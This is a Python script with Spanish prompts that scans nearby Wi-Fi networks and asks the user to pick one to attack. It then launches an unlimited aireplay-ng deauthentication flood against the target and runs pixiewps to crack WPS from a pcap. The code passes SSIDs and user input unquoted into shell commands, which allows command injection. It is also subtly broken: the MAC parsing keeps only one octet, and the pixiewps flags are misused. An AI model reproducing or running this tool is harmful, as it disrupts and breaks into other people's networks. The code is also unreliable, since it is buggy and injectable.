import subprocess
import time

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y muestra la salida"""
    if use_sudo:
        command = f"sudo {command}"
    print(f"Ejecutando comando: {command}")
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode()
    else:
        return stderr.decode()

def scan_wifi():
    """Escanear redes Wi-Fi cercanas"""
    print("Escaneando redes Wi-Fi...\n")
    result = run_command("iw dev wlan0 scan | grep SSID | awk -F ':' '{print $2}'", use_sudo=True)
    
    if not result:
        print("No se encontraron redes Wi-Fi.\n")
        return []
    
    networks = result.strip().split("\n")
    networks = [net.strip() for net in networks if net.strip()]
    
    # Mostrar redes de forma atractiva
    if networks:
        print("Redes Wi-Fi encontradas:")
        for idx, network in enumerate(networks, 1):
            print(f"{idx}. {network}")
    else:
        print("No se encontraron redes Wi-Fi válidas.\n")
    
    return networks

def get_mac_address(ssid):
    """Obtener la dirección MAC de una red Wi-Fi a partir de su SSID"""
    print(f"Obteniendo MAC para la red: {ssid}\n")
    result = run_command(f"iw dev wlan0 scan | grep '{ssid}' -A 5 | grep 'SSID' -A 10", use_sudo=True)
    
    mac = None
    for line in result.splitlines():
        if 'address' in line.lower():
            mac = line.split(":")[1].strip()
            break
    
    return mac

def select_network(networks):
    """Permitir al usuario seleccionar una red"""
    if not networks:
        print("No hay redes disponibles para seleccionar.\n")
        return None
    
    while True:
        try:
            choice = int(input("\nSelecciona el número de la red que deseas atacar: "))
            if 1 <= choice <= len(networks):
                return networks[choice - 1]
            else:
                print("Número fuera de rango. Intenta nuevamente.")
        except ValueError:
            print("Por favor, ingresa un número válido.")

def deauth_attack(target_mac):
    """Realizar un ataque de desautenticación"""
    print(f"Realizando ataque de desautenticación contra {target_mac}...\n")
    result = run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0", use_sudo=True)
    print(result)
    print("Ataque de desautenticación finalizado.\n")

def pixiewps_attack(target_pcap):
    """Realizar un ataque Pixiewps sobre un archivo pcap"""
    print(f"Realizando ataque Pixiewps sobre {target_pcap}...\n")
    result = run_command(f"pixiewps -r {target_pcap} -o cracked.txt", use_sudo=True)
    print(result)
    print("Ataque Pixiewps finalizado.\n")

def main():
    # Escanear redes Wi-Fi
    networks = scan_wifi()
    
    # Si no hay redes disponibles, terminar el script
    if not networks:
        return
    
    # Seleccionar la red
    target_network = select_network(networks)
    
    if target_network:
        print(f"\nHas seleccionado la red: {target_network}")
    
        # Obtener la dirección MAC de la red seleccionada
        target_mac = get_mac_address(target_network)
        
        if target_mac:
            print(f"Dirección MAC obtenida: {target_mac}")
            # Realizar ataque de desautenticación
            deauth_attack(target_mac)
        else:
            print("No se pudo obtener la dirección MAC de la red seleccionada.")
        
        # Realizar ataque Pixiewps
        target_pcap = input("Introduce el archivo pcap para Pixiewps: ")
        pixiewps_attack(target_pcap)

if __name__ == "__main__":
    main()

